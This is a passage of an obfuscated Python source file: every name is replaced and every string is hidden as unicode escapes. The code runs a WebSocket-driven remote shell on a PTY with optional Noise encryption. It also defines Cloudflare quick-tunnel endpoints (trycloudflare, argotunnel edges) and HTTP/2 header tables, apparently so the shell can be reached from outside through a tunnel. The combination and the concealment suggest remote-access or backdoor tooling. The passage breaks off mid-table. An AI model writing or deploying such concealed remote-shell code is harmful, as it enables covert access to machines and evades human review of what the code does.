            O0_var_353(codecs.decode('\\u2705\\u0020\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u63e1\\u624b\\u5b8c\\u6210\\uff0c\\u7aef\\u5230\\u7aef\\u52a0\\u5bc6\\u901a\\u9053\\u5df2\\u5efa\\u7acb\\uff01', 'unicode_escape'))
        except PermissionError as e:
            O0_var_353(codecs.decode('\\U0001f6a8\\u0020\\u62d2\\u7edd\\u8bbf\\u95ee\\u003a\\u0020', 'unicode_escape') + str(e))
            raise
        except Exception as e:
            O0_var_353(codecs.decode('\\U0001f4a5\\u0020\\u63e1\\u624b\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e))
            raise RuntimeError(codecs.decode('\\u52a0\\u5bc6\\u63e1\\u624b\\u5931\\u8d25', 'unicode_escape'))

    async def start_session(self, O0_var_357: WebSocket, O0_var_358: str, O0_var_359: bool=True):
        self.websocket = O0_var_357
        self.request_id = O0_var_358
        self.use_noise = O0_var_359
        O0_var_360 = lambda msg: Logger.info(codecs.decode('\\u005b\\u7ec8\\u7aef\\u4f1a\\u8bdd\\u0020', 'unicode_escape') + str(O0_var_358) + codecs.decode('\\u005d\\u0020', 'unicode_escape') + str(msg))
        O0_var_360(codecs.decode('\\u7ec8\\u7aef\\u4f1a\\u8bdd\\u5df2\\u5efa\\u7acb\\uff0c\\u7b49\\u5f85\\u63a5\\u53d7\\u8fde\\u63a5\\u002e\\u002e\\u002e', 'unicode_escape'))
        try:
            await O0_var_357.accept()
            O0_var_360(codecs.decode('\\u2705\\u0020\\u0057\\u0065\\u0062\\u0053\\u006f\\u0063\\u006b\\u0065\\u0074\\u0020\\u8fde\\u63a5\\u5df2\\u63a5\\u53d7', 'unicode_escape'))
            if self.use_noise:
                await self._do_noise_handshake(O0_var_357, O0_var_360)
            else:
                O0_var_360(codecs.decode('\\u26a1\\u0020\\u8d70\\u0020\\u0048\\u0054\\u0054\\u0050\\u0053\\u0020\\u660e\\u6587\\u964d\\u7ea7\\u901a\\u9053\\uff0c\\u8df3\\u8fc7\\u0020\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u63e1\\u624b\\u3002', 'unicode_escape'))
            await self._run_terminal(O0_var_357, O0_var_358, O0_var_360)
        except WebSocketDisconnect:
            O0_var_360(codecs.decode('\\U0001f50c\\u0020\\u5ba2\\u6237\\u7aef\\u4e3b\\u52a8\\u65ad\\u5f00\\u8fde\\u63a5', 'unicode_escape'))
        except Exception as e:
            O0_var_360(codecs.decode('\\u274c\\u0020\\u7ec8\\u7aef\\u4f1a\\u8bdd\\u5f02\\u5e38\\u003a\\u0020', 'unicode_escape') + str(type(e).__name__) + codecs.decode('\\u0020\\u002d\\u0020', 'unicode_escape') + str(e))
        finally:
            await self.cleanup()
            O0_var_360(codecs.decode('\\u2705\\u0020\\u8d44\\u6e90\\u6e05\\u7406\\u5b8c\\u6bd5\\u003a\\u0020', 'unicode_escape') + str(O0_var_358))

    @staticmethod
    def get_available_shell():
        if _IS_WINDOWS:
            return _windows_default_shell()
        for O0_var_361 in [codecs.decode('\\u0062\\u0061\\u0073\\u0068', 'unicode_escape'), codecs.decode('\\u007a\\u0073\\u0068', 'unicode_escape'), codecs.decode('\\u0061\\u0073\\u0068', 'unicode_escape')]:
            O0_var_362 = shutil.which(O0_var_361)
            if O0_var_362:
                return O0_var_362
        O0_var_363 = os.environ.get(codecs.decode('\\u0053\\u0048\\u0045\\u004c\\u004c', 'unicode_escape'))
        if O0_var_363 and os.path.exists(O0_var_363) and os.access(O0_var_363, os.X_OK):
            return O0_var_363
        return shutil.which(codecs.decode('\\u0073\\u0068', 'unicode_escape')) or codecs.decode('\\u002f\\u0062\\u0069\\u006e\\u002f\\u0073\\u0068', 'unicode_escape')

    def set_pty_size(self, O0_var_364: int, O0_var_365: int):
        O0_var_366 = getattr(self, codecs.decode('\\u0074\\u0065\\u0072\\u006d\\u0069\\u006e\\u0061\\u006c', 'unicode_escape'), None)
        if O0_var_366 is not None:
            O0_var_366.set_size(O0_var_364, O0_var_365)
            return
        if self.master_fd is not None:
            try:
                O0_var_367 = struct.pack(codecs.decode('\\u0048\\u0048\\u0048\\u0048', 'unicode_escape'), O0_var_364, O0_var_365, 0, 0)
                fcntl.ioctl(self.master_fd, termios.TIOCSWINSZ, O0_var_367)
            except Exception as e:
                Logger.warning(codecs.decode('\\u8bbe\\u7f6e\\u0020\\u0050\\u0054\\u0059\\u0020\\u5c3a\\u5bf8\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e))

    async def _run_terminal(self, O0_var_368: WebSocket, O0_var_369: str, O0_var_370):
        self.master_fd = None
        self.slave_fd = None
        try:
            O0_var_371 = os.environ.copy()
            O0_var_371.pop(codecs.decode('\\u0050\\u0052\\u004f\\u004d\\u0050\\u0054\\u005f\\u0043\\u004f\\u004d\\u004d\\u0041\\u004e\\u0044', 'unicode_escape'), None)
            O0_var_371.setdefault(codecs.decode('\\u0054\\u0045\\u0052\\u004d', 'unicode_escape'), codecs.decode('\\u0078\\u0074\\u0065\\u0072\\u006d\\u002d\\u0032\\u0035\\u0036\\u0063\\u006f\\u006c\\u006f\\u0072', 'unicode_escape'))
            if codecs.decode('\\u004c\\u0041\\u004e\\u0047', 'unicode_escape') not in O0_var_371:
                O0_var_371[codecs.decode('\\u004c\\u0041\\u004e\\u0047', 'unicode_escape')] = codecs.decode('\\u0043\\u002e\\u0055\\u0054\\u0046\\u002d\\u0038', 'unicode_escape')
            if _IS_WINDOWS:
                await self._run_terminal_windows(O0_var_368, O0_var_369, O0_var_370, O0_var_371)
                return
            self.master_fd, self.slave_fd = pty.openpty()
            self.set_pty_size(24, 80)
            O0_var_372 = self.get_available_shell()
            O0_var_370(codecs.decode('\\U0001f41a\\u0020\\u4f7f\\u7528\\u0020\\u0053\\u0068\\u0065\\u006c\\u006c\\u0020\\u8def\\u5f84\\u003a\\u0020', 'unicode_escape') + str(O0_var_372))

            def pty_preexec():
                import termios, fcntl
                os.setsid()
                try:
                    fcntl.ioctl(0, termios.TIOCSCTTY, 0)
                except Exception:
                    pass
            self.process = await asyncio.create_subprocess_exec(O0_var_372, stdin=self.slave_fd, stdout=self.slave_fd, stderr=self.slave_fd, env=O0_var_371, preexec_fn=pty_preexec)
            O0_var_370(codecs.decode('\\U0001f680\\u0020\\u7ec8\\u7aef\\u8fdb\\u7a0b\\u5df2\\u542f\\u52a8\\u0020\\u0028\\u0050\\u0049\\u0044\\u003a\\u0020', 'unicode_escape') + str(self.process.pid) + codecs.decode('\\u0029', 'unicode_escape'))
            if self.slave_fd is not None:
                os.close(self.slave_fd)
                self.slave_fd = None
            O0_var_373 = fcntl.fcntl(self.master_fd, fcntl.F_GETFL)
            fcntl.fcntl(self.master_fd, fcntl.F_SETFL, O0_var_373 | os.O_NONBLOCK)
            O0_var_374 = [asyncio.create_task(self._handle_pty_output(O0_var_368, self.master_fd, O0_var_370)), asyncio.create_task(self._handle_websocket_input(O0_var_368, self.master_fd, O0_var_370)), asyncio.create_task(self._monitor_process(self.process, O0_var_370))]
            O0_var_375, O0_var_376 = await asyncio.wait(O0_var_374, return_when=asyncio.FIRST_COMPLETED)
            for O0_var_377 in O0_var_376:
                O0_var_377.cancel()
            try:
                await O0_var_368.close(code=1000, reason=codecs.decode('\\u0054\\u0065\\u0072\\u006d\\u0069\\u006e\\u0061\\u006c\\u0020\\u0065\\u0078\\u0069\\u0074\\u0065\\u0064\\u0020\\u006e\\u006f\\u0072\\u006d\\u0061\\u006c\\u006c\\u0079', 'unicode_escape'))
            except Exception:
                pass
        except Exception as e:
            O0_var_370(codecs.decode('\\U0001f4a5\\u0020\\u542f\\u52a8\\u7ec8\\u7aef\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(type(e).__name__) + codecs.decode('\\u0020\\u002d\\u0020', 'unicode_escape') + str(str(e)))
            await self.cleanup()
            raise

    async def _run_terminal_windows(self, O0_var_378: WebSocket, O0_var_379: str, O0_var_380, env: dict):
        try:
            O0_var_381 = self.get_available_shell()
            O0_var_380(codecs.decode('\\U0001f41a\\u0020\\u4f7f\\u7528\\u0020\\u0053\\u0068\\u0065\\u006c\\u006c\\u0020\\u8def\\u5f84\\u003a\\u0020', 'unicode_escape') + str(O0_var_381))
            O0_var_382 = _resolve_safe_cwd()
            O0_var_383 = _create_windows_backend(O0_var_381, env, 24, 80, O0_var_382)
            O0_var_383.start()
            self.terminal = O0_var_383
            self.process = None
            O0_var_380(codecs.decode('\\U0001f680\\u0020\\u7ec8\\u7aef\\u8fdb\\u7a0b\\u5df2\\u542f\\u52a8\\u0020\\u0028\\u0050\\u0049\\u0044\\u003a\\u0020', 'unicode_escape') + str(O0_var_383.pid) + codecs.decode('\\u0029', 'unicode_escape'))
            O0_var_384 = [asyncio.create_task(self._handle_windows_output(O0_var_378, O0_var_383, O0_var_380)), asyncio.create_task(self._handle_websocket_input(O0_var_378, O0_var_383, O0_var_380))]
            O0_var_385, O0_var_386 = await asyncio.wait(O0_var_384, return_when=asyncio.FIRST_COMPLETED)
            for O0_var_387 in O0_var_386:
                O0_var_387.cancel()
            try:
                await O0_var_378.close(code=1000, reason=codecs.decode('\\u0054\\u0065\\u0072\\u006d\\u0069\\u006e\\u0061\\u006c\\u0020\\u0065\\u0078\\u0069\\u0074\\u0065\\u0064\\u0020\\u006e\\u006f\\u0072\\u006d\\u0061\\u006c\\u006c\\u0079', 'unicode_escape'))
            except Exception:
                pass
        except Exception as e:
            O0_var_380(codecs.decode('\\U0001f4a5\\u0020\\u542f\\u52a8\\u7ec8\\u7aef\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(type(e).__name__) + codecs.decode('\\u0020\\u002d\\u0020', 'unicode_escape') + str(str(e)))
            await self.cleanup()
            raise

    @staticmethod
    def _write_terminal(target, data: bytes):
        if isinstance(target, int):
            os.write(target, data)
        else:
            target.write(data)

    async def _handle_windows_output(self, O0_var_388: WebSocket, O0_var_389, O0_var_390):
        O0_var_391 = asyncio.get_running_loop()
        O0_var_392 = asyncio.Queue()
        O0_var_393 = threading.Event()

        def reader():
            while not O0_var_393.is_set():
                try:
                    O0_var_394 = O0_var_389.read(8192)
                except OSError:
                    break
                if O0_var_394 is None:
                    time.sleep(0.01)
                    continue
                if not O0_var_394:
                    break
                O0_var_391.call_soon_threadsafe(O0_var_392.put_nowait, O0_var_394)
            O0_var_391.call_soon_threadsafe(O0_var_392.put_nowait, None)
        O0_var_395 = threading.Thread(target=reader, daemon=True, name=codecs.decode('\\u0063\\u006f\\u006e\\u0070\\u0074\\u0079\\u002d\\u0072\\u0065\\u0061\\u0064\\u0065\\u0072\\u002d', 'unicode_escape') + str(self.request_id))
        O0_var_395.start()
        try:
            while True:
                O0_var_396 = await O0_var_392.get()
                if O0_var_396 is None:
                    break
                if self.use_noise:
                    O0_var_397 = self.cipher.encrypt(O0_var_396)
                else:
                    O0_var_397 = O0_var_396
                await O0_var_388.send_bytes(O0_var_397)
        except (WebSocketDisconnect, ConnectionResetError, OSError):
            pass
        finally:
            O0_var_393.set()
            O0_var_390(codecs.decode('\\U0001f50c\\u0020\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077\\u0073\\u0020\\u7ec8\\u7aef\\u8f93\\u51fa\\u5faa\\u73af\\u7ed3\\u675f', 'unicode_escape'))

    async def _handle_pty_output(self, O0_var_398: WebSocket, O0_var_399: int, O0_var_400):
        try:
            while True:
                if O0_var_399 is None:
                    break
                O0_var_401, O0_var_402, O0_var_402 = select.select([O0_var_399], [], [], 0.1)
                if O0_var_399 in O0_var_401:
                    try:
                        O0_var_403 = os.read(O0_var_399, 8192)
                        if not O0_var_403:
                            break
                        if self.use_noise:
                            O0_var_404 = self.cipher.encrypt(O0_var_403)
                            await O0_var_398.send_bytes(O0_var_404)
                        else:
                            await O0_var_398.send_bytes(O0_var_403)
                    except BlockingIOError:
                        await asyncio.sleep(0.01)
                    except OSError as e:
                        if e.errno == 5:
                            break
                        raise
                else:
                    await asyncio.sleep(0.01)
        except (OSError, WebSocketDisconnect, ConnectionResetError):
            pass

    async def _handle_websocket_input(self, O0_var_405: WebSocket, O0_var_406: int, O0_var_407):
        try:
            async for O0_var_408 in O0_var_405.iter_bytes():
                if O0_var_406 is None:
                    break
                if self.use_noise:
                    try:
                        O0_var_409 = self.cipher.decrypt(O0_var_408)
                    except Exception as e:
                        O0_var_407(codecs.decode('\\u26a0\\ufe0f\\u0020\\u89e3\\u5bc6\\u5931\\u8d25\\uff0c\\u6536\\u5230\\u975e\\u6cd5\\u5305\\u003a\\u0020', 'unicode_escape') + str(e))
                        break
                else:
                    O0_var_409 = O0_var_408
                try:
                    O0_var_410 = O0_var_409.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
                    if O0_var_410.strip().startswith(codecs.decode('\\u007b', 'unicode_escape')):
                        O0_var_411 = json.loads(O0_var_410)
                        O0_var_412 = O0_var_411.get(codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'))
                        if O0_var_412 == codecs.decode('\\u0068\\u0065\\u0061\\u0072\\u0074\\u0062\\u0065\\u0061\\u0074', 'unicode_escape'):
                            O0_var_413 = json.dumps({codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'): codecs.decode('\\u0068\\u0065\\u0061\\u0072\\u0074\\u0062\\u0065\\u0061\\u0074', 'unicode_escape')}).encode()
                            if self.use_noise:
                                await O0_var_405.send_bytes(self.cipher.encrypt(O0_var_413))
                            else:
                                await O0_var_405.send_bytes(O0_var_413)
                            continue
                        if O0_var_412 == codecs.decode('\\u0072\\u0065\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'):
                            O0_var_414, O0_var_415 = (O0_var_411.get(codecs.decode('\\u0072\\u006f\\u0077\\u0073', 'unicode_escape'), 24), O0_var_411.get(codecs.decode('\\u0063\\u006f\\u006c\\u0073', 'unicode_escape'), 80))
                            self.set_pty_size(O0_var_414, O0_var_415)
                            continue
                        if O0_var_412 == codecs.decode('\\u0069\\u006e\\u0070\\u0075\\u0074', 'unicode_escape') and codecs.decode('\\u0064\\u0061\\u0074\\u0061', 'unicode_escape') in O0_var_411:
                            O0_var_416 = O0_var_411[codecs.decode('\\u0064\\u0061\\u0074\\u0061', 'unicode_escape')]
                            if O0_var_411.get(codecs.decode('\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape')) == codecs.decode('\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034', 'unicode_escape'):
                                O0_var_417 = base64.b64decode(O0_var_416)
                            else:
                                O0_var_417 = O0_var_416.encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
                            self._write_terminal(O0_var_406, O0_var_417)
                            continue
                except (UnicodeDecodeError, json.JSONDecodeError):
                    pass
                self._write_terminal(O0_var_406, O0_var_409)
        except WebSocketDisconnect:
            O0_var_407(codecs.decode('\\U0001f50c\\u0020\\u5ba2\\u6237\\u7aef\\u65ad\\u5f00\\uff0c\\u505c\\u6b62\\u63a5\\u6536\\u8f93\\u5165', 'unicode_escape'))
        except OSError:
            pass

    async def _monitor_process(self, O0_var_418, O0_var_419):
        try:
            await O0_var_418.wait()
        except Exception:
            pass
QUICK_SERVICE = codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0061\\u0070\\u0069\\u002e\\u0074\\u0072\\u0079\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u002e\\u0063\\u006f\\u006d', 'unicode_escape')
EDGE_HOSTS = (codecs.decode('\\u0072\\u0065\\u0067\\u0069\\u006f\\u006e\\u0031\\u002e\\u0076\\u0032\\u002e\\u0061\\u0072\\u0067\\u006f\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u002e\\u0063\\u006f\\u006d', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0067\\u0069\\u006f\\u006e\\u0032\\u002e\\u0076\\u0032\\u002e\\u0061\\u0072\\u0067\\u006f\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u002e\\u0063\\u006f\\u006d', 'unicode_escape'))
EDGE_PORT = 7844
CONTROL_HEADER = codecs.decode('\\u0063\\u0066\\u002d\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u0064\\u002d\\u0070\\u0072\\u006f\\u0078\\u0079\\u002d\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u002d\\u0075\\u0070\\u0067\\u0072\\u0061\\u0064\\u0065', 'unicode_escape')
CONTROL_STREAM = codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c\\u002d\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d', 'unicode_escape')
UPDATE_CONFIGURATION = codecs.decode('\\u0075\\u0070\\u0064\\u0061\\u0074\\u0065\\u002d\\u0063\\u006f\\u006e\\u0066\\u0069\\u0067\\u0075\\u0072\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape')
MAX_FRAME_SIZE = 16384
STATIC_TABLE = ((codecs.decode('\\u003a\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u0074\\u0079', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u003a\\u006d\\u0065\\u0074\\u0068\\u006f\\u0064', 'unicode_escape'), codecs.decode('\\u0047\\u0045\\u0054', 'unicode_escape')), (codecs.decode('\\u003a\\u006d\\u0065\\u0074\\u0068\\u006f\\u0064', 'unicode_escape'), codecs.decode('\\u0050\\u004f\\u0053\\u0054', 'unicode_escape')), (codecs.decode('\\u003a\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'), codecs.decode('\\u002f', 'unicode_escape')), (codecs.decode('\\u003a\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'), codecs.decode('\\u002f\\u0069\\u006e\\u0064\\u0065\\u0078\\u002e\\u0068\\u0074\\u006d\\u006c', 'unicode_escape')), (codecs.decode('\\u003a\\u0073\\u0063\\u0068\\u0065\\u006d\\u0065', 'unicode_escape'), codecs.decode('\\u0068\\u0074\\u0074\\u0070', 'unicode_escape')), (codecs.decode('\\u003a\\u0073\\u0063\\u0068\\u0065\\u006d\\u0065', 'unicode_escape'), codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073', 'unicode_escape')), (codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0032\\u0030\\u0030', 'unicode_escape')), (codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0032\\u0030\\u0034', 'unicode_escape')), (codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0032\\u0030\\u0036', 'unicode_escape')), (codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0033\\u0030\\u0034', 'unicode_escape')), (codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0034\\u0030\\u0030', 'unicode_escape')), (codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0034\\u0030\\u0034', 'unicode_escape')), (codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0035\\u0030\\u0030', 'unicode_escape')), (codecs.decode('\\u0061\\u0063\\u0063\\u0065\\u0070\\u0074\\u002d\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0061\\u0063\\u0063\\u0065\\u0070\\u0074\\u002d\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'), codecs.decode('\\u0067\\u007a\\u0069\\u0070\\u002c\\u0020\\u0064\\u0065\\u0066\\u006c\\u0061\\u0074\\u0065', 'unicode_escape')), (codecs.decode('\\u0061\\u0063\\u0063\\u0065\\u0070\\u0074\\u002d\\u006c\\u0061\\u006e\\u0067\\u0075\\u0061\\u0067\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0061\\u0063\\u0063\\u0065\\u0070\\u0074\\u002d\\u0072\\u0061\\u006e\\u0067\\u0065\\u0073', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0061\\u0063\\u0063\\u0065\\u0070\\u0074', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0061\\u0063\\u0063\\u0065\\u0073\\u0073\\u002d\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c\\u002d\\u0061\\u006c\\u006c\\u006f\\u0077\\u002d\\u006f\\u0072\\u0069\\u0067\\u0069\\u006e', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0061\\u0067\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0061\\u006c\\u006c\\u006f\\u0077', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u007a\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0063\\u0061\\u0063\\u0068\\u0065\\u002d\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0064\\u0069\\u0073\\u0070\\u006f\\u0073\\u0069\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u0061\\u006e\\u0067\\u0075\\u0061\\u0067\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u006f\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0072\\u0061\\u006e\\u0067\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006f\\u006b\\u0069\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0064\\u0061\\u0074\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0065\\u0074\\u0061\\u0067', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0065\\u0078\\u0070\\u0065\\u0063\\u0074', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0065\\u0078\\u0070\\u0069\\u0072\\u0065\\u0073', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0068\\u006f\\u0073\\u0074', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0069\\u0066\\u002d\\u006d\\u0061\\u0074\\u0063\\u0068', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0069\\u0066\\u002d\\u006d\\u006f\\u0064\\u0069\\u0066\\u0069\\u0065\\u0064\\u002d\\u0073\\u0069\\u006e\\u0063\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0069\\u0066\\u002d\\u006e\\u006f\\u006e\\u0065\\u002d\\u006d\\u0061\\u0074\\u0063\\u0068', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0069\\u0066\\u002d\\u0072\\u0061\\u006e\\u0067\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0069\\u0066\\u002d\\u0075\\u006e\\u006d\\u006f\\u0064\\u0069\\u0066\\u0069\\u0065\\u0064\\u002d\\u0073\\u0069\\u006e\\u0063\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u006c\\u0061\\u0073\\u0074\\u002d\\u006d\\u006f\\u0064\\u0069\\u0066\\u0069\\u0065\\u0064', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u006c\\u0069\\u006e\\u006b', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u006d\\u0061\\u0078\\u002d\\u0066\\u006f\\u0072\\u0077\\u0061\\u0072\\u0064\\u0073', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0070\\u0072\\u006f\\u0078\\u0079\\u002d\\u0061\\u0075\\u0074\\u0068\\u0065\\u006e\\u0074\\u0069\\u0063\\u0061\\u0074\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0070\\u0072\\u006f\\u0078\\u0079\\u002d\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u007a\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0072\\u0061\\u006e\\u0067\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0072\\u0065\\u0066\\u0065\\u0072\\u0065\\u0072', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0072\\u0065\\u0066\\u0072\\u0065\\u0073\\u0068', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0072\\u0065\\u0074\\u0072\\u0079\\u002d\\u0061\\u0066\\u0074\\u0065\\u0072', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0073\\u0065\\u0072\\u0076\\u0065\\u0072', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0073\\u0065\\u0074\\u002d\\u0063\\u006f\\u006f\\u006b\\u0069\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0073\\u0074\\u0072\\u0069\\u0063\\u0074\\u002d\\u0074\\u0072\\u0061\\u006e\\u0073\\u0070\\u006f\\u0072\\u0074\\u002d\\u0073\\u0065\\u0063\\u0075\\u0072\\u0069\\u0074\\u0079', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0074\\u0072\\u0061\\u006e\\u0073\\u0066\\u0065\\u0072\\u002d\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0075\\u0073\\u0065\\u0072\\u002d\\u0061\\u0067\\u0065\\u006e\\u0074', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0076\\u0061\\u0072\\u0079', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0076\\u0069\\u0061', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0077\\u0077\\u0077\\u002d\\u0061\\u0075\\u0074\\u0068\\u0065\\u006e\\u0074\\u0069\\u0063\\u0061\\u0074\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')))
HUFFMAN_CODES = (8184, 8388568, 268435426, 268435427, 268435428, 268435429, 268435430, 268435431, 268435432, 16777194, 1073741820, 268435433, 268435434, 1073741821, 268435435, 268435436, 268435437, 268435438, 268435439, 268435440, 268435441, 268435442, 1073741822, 268435443, 268435444, 268435445, 268435446, 268435447, 268435448, 268435449, 268435450, 268435451, 20, 1016, 1017, 4090, 8185, 21, 248, 2042, 1018, 1019, 249, 2043, 250, 22, 23, 24, 0, 1, 2, 25, 26, 27, 28, 29, 30, 31, 92, 251, 32764, 32, 4091, 1020, 8186, 33, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 252, 115, 253, 8187, 524272, 8188, 16380, 34, 32765, 3, 35, 4, 36, 5, 37, 38, 39, 6, 116, 117, 40, 41, 42, 7, 43, 118, 44, 8, 9, 45, 119, 120, 121, 122, 123, 32766, 2044, 16381, 8189, 268435452, 1048550, 4194258, 1048551, 1048552, 4194259, 4194260, 4194261, 8388569, 4194262, 8388570, 8388571, 8388572, 8388573, 8388574, 16777195, 8388575, 16777196, 16777197, 4194263, 8388576, 16777198, 8388577, 8388578, 8388579, 8388580, 2097116, 4194264, 8388581, 4194265, 8388582, 